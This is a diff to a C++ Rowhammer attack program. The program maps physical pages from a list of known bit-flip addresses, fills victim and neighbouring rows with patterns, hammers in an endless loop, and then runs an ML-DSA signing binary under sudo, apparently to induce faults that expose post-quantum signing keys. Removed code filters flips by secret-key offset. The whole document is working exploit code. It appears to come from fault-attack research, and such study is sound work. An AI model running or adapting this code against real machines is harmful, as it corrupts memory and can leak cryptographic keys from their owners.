@@ -14,7 +14,7 @@
 #include <cstdio>
 #include <sys/sysinfo.h>
 #include <utility> 
-#include <sys/personality.h>
+#include <sys/personality.h> 
 
 
 #include <sched.h>
@@ -33,14 +33,15 @@
 using namespace std;
 int OFFSET=0;
 int STACK_SIZE = 0;
-int NUMBER_PAGES=0,NUMBER_TARGET=3;
+int NUMBER_PAGES=0,NUMBER_TARGET=4;
 int TARGET_PAGE[100];
 size_t mem_size;
 char *memory;
+char *smapping;
 double fraction_of_physical_memory = 0.4;
 
 int *hammer;
-uintptr_t attackPages[10086], abovePages[10086], belowPages[10086],offset[10086];
+uintptr_t attackPages[30086], abovePages[30086], belowPages[30086],offset[30086];
 
 enum Pattern { zero_zero_zero, zero_zero_one, one_zero_zero, one_zero_one };
 
@@ -136,10 +137,12 @@ void setupMapping() {
 }
 
 void fillMemory(uint8_t* victimVA, uint8_t* aboveVA, uint8_t* belowVA) {
+    //printf("VA: %p above: %p below: %p\n",victimVA,aboveVA, belowVA);
     memset((void *) victimVA, 0x00, PAGE_SIZE);
 
     uint8_t lowerBits = 0x00;
     uint8_t upperBits = 0x01;
+    
     for(int i = 0; i < PAGE_SIZE; i++) {
         if(i % 2 == 0) {
             memset((void *) (aboveVA + i), lowerBits, 1);
@@ -176,31 +179,35 @@ void rowhammer(uint8_t* aboveVA, uint8_t* belowVA, int iterations, int togs) {
 void addVAstoPages(vector<PageCandidate> &pages) {
     printf("Searching for page VAs...\n");
     uint8_t* moverVA = (uint8_t*) memory;
+    int j=0;
     while (moverVA < (((uint8_t*) memory) + mem_size)) {
         uintptr_t moverPA = getPage(moverVA);
 	    bool match = false;
         for(int i = 0; i < pages.size(); i++) {
             PageCandidate p = pages[i];
+	    int temp=0;
+        //printf("pagenumber: %ld abovepage: %ld belowpage: %ld moverPA: %ld:\n", 
+           // p.pageNumber,p.abovePage,p.belowPage, moverPA);
             if(p.pageNumber == moverPA) {
                 p.pageVA = moverVA;
 		        match = true;
+                
             }
 
             if(p.abovePage == moverPA) {
                 p.aboveVA[0] = moverVA;
 	        	match = true;
+                
             }
             if(p.belowPage == moverPA) {
                 p.belowVA[0] = moverVA;
 	        	match = true;
+               
             }
-
+            
             pages[i] = p;
         }
-
-
-
-            moverVA += 0x1000;
+        moverVA += 0x1000;
     }
     printf("Done searching...\n\n");
 }
@@ -210,7 +217,9 @@ void addVAstoPages(vector<PageCandidate> &pages) {
 void rowhammerAttack(vector<PageCandidate> &pages) {
     int i,j=0;
     int r=OFFSET;
+    
     for(int i = 0; i < NUMBER_PAGES; i++) {
+        
     if(pages[i].aboveVA[0]!=NULL && pages[i].belowVA[0]!=NULL && pages[i].pageVA !=NULL)
     {
     	TARGET_PAGE[j]=i;
@@ -246,15 +255,15 @@ void rowhammerAttack(vector<PageCandidate> &pages) {
 
   //  printf("Holding same DRAM pages\n");
     
-	
     for(int i = 0; i < NUMBER_TARGET; i++) {
+        //printf("i: %d\n",i);
 	    PageCandidate p = pages[TARGET_PAGE[i]];
 	    fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
 	  //  fillMemory(p.pageVA, p.aboveVA[1], p.belowVA[1]);
 	   // printf("pageNUmber:%d\n",p.pageNumber);
            // formOuterPages(p);
     }
-
+    
 
 	 //    p = pages[TARGET_PAGE];
 	  //  fillMemory(p.pageVA, p.aboveVA[0], p.belowVA[0]);
@@ -300,8 +309,8 @@ FILE* fp4=fopen("page.txt","w");
 
 
     printf("Starting hammering...\n");
-
-    fflush(stdout);
+    
+   fflush(stdout);
   //  sleep(1);
 
 
@@ -331,15 +340,15 @@ FILE* fp4=fopen("page.txt","w");
             int index = indices[i].first;
             memset(mapping + PAGE_SIZE * index, (NUMBER_PAGES + index)&0xFF, PAGE_SIZE);
         }
-        *hammer=1;
-       // usleep(1000);
-        while(*hammer) {
-        printf("hammer!\n");
+       // usleep(100);
+        while(1) {
                 int togs = TOGGLES;
                 for(int pNum = 0; pNum < NUMBER_TARGET; pNum++) {
            //     printf("hammer %lx!\n",pages[TARGET_PAGE[pNum]].pageNumber );
                 rowhammer(pages[TARGET_PAGE[pNum]].aboveVA[0], pages[TARGET_PAGE[pNum]].belowVA[0], 1, togs);
                 }
+        printf("hammer!\n");
+		fflush(stdout);
 
         
         }
@@ -354,7 +363,7 @@ FILE* fp4=fopen("page.txt","w");
             printf("ERROR WITH SCHEDAFFINITY");
 	size_t s=200*4096;
         mem_size = s;
-	mmap(NULL, s, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
+	smapping=(char *) mmap(NULL, s, PROT_READ | PROT_WRITE, MAP_POPULATE | MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
 //	while(!*(hammer));
         for(int i = 0; i < JUNK1; i++) {
             int index = indices[i].first;
@@ -381,7 +390,7 @@ FILE* fp4=fopen("page.txt","w");
         printf("finish munmaping\n");
 	//usleep(1000);
         
-	int ok = system("sudo taskset -c 3 ./liboqs-fault/ml_dsa");
+	int ok = system("sudo taskset -c 3 ./ml_dsa");
 //	int ok = system("sudo taskset -c 7 ./test/main");
         //int ok = system("sudo taskset 0x2 ./check");
         
@@ -422,16 +431,17 @@ int main(int argc, char *argv[]) {
  cpu_set_t set;
         CPU_ZERO(&set);
         CPU_SET(2, &set);
-        printf("%d\n",OFFSET);
+        printf("OFFSET: %d\n",OFFSET);
         if (sched_setaffinity(getpid(), sizeof(set), &set) == -1)
             printf("ERROR WITH SCHEDAFFINITY");
             
-    printf("Stack size is %i\n", STACK_SIZE);
+    //printf("Stack size is %i\n", STACK_SIZE);
     FILE *fp=fopen("bitflip_addrs","r");
     if(fp==NULL){
     printf("can not load file!\n");
     }
-    char line[1000],temp;
+    
+    char line[10000],temp;
     int bit;
     long tt;
     while(fgets(line,sizeof(line),fp)!=NULL)
@@ -466,41 +476,10 @@ int main(int argc, char *argv[]) {
     	
     	if(token!=NULL){
     	
-    	
-    //	if(offset[NUMBER_PAGES]>=8*0x100 && offset[NUMBER_PAGES] <(8*0x120) && offset[NUMBER_PAGES]-0x100*8-OFFSET<128 && offset[NUMBER_PAGES]-0x100*8-OFFSET>=0){
-   	if(offset[NUMBER_PAGES]>=(8*0x0e0) && offset[NUMBER_PAGES] <(8*0x100)){
-    	
-    	NUMBER_PAGES++;
-    	//printf("%lx\n",tt);
-    	
-    	
-    	
+   	NUMBER_PAGES++;
+
     	}
-    
-    	/*
-    	if(offset[NUMBER_PAGES]>=8*0x20 && offset[NUMBER_PAGES] <8*0x58){
-    	
-    	if(atoi(token)==0){
-    	temp= sk2[offset[NUMBER_PAGES]/8-16] & (~(1 << (offset[NUMBER_PAGES]%8)));
-    	}
-    	
-    	else{
-    	temp= sk2[offset[NUMBER_PAGES]/8-16] | (1 << (offset[NUMBER_PAGES]%8));
-    	}
-    	
-    	
-    	
-    	
-    	if(temp!=sk2[offset[NUMBER_PAGES]/8-16]){
-    	
-    	NUMBER_PAGES++;
-    	//printf("%lx\n",tt);
-    	
-    	}
-    	
-    	}
-    	*/
-    	}
+        //printf("here\n");
     }
     printf("get %d pages!\n",NUMBER_PAGES);
 
@@ -518,9 +497,10 @@ int main(int argc, char *argv[]) {
 
     setupMapping();
     printf("Finished setting up memory...\n");
+    
     int i;
     vector<PageCandidate> pages;
-    for(int k =0; k < NUMBER_PAGES; k++) {
+    for(int k =0; k < NUMBER_PAGES; k+=17) {
 	i=(k+OFFSET)%NUMBER_PAGES;
         PageCandidate p;
         p.pageNumber = attackPages[i];
@@ -531,6 +511,10 @@ int main(int argc, char *argv[]) {
         p.aboveVA[0] = 0;
         p.belowVA[0] = 0;
         pages.push_back(p);
+	// if(pages.size()>1000){
+        
+	// 	break;
+	// }
     }
 
     addVAstoPages(pages);
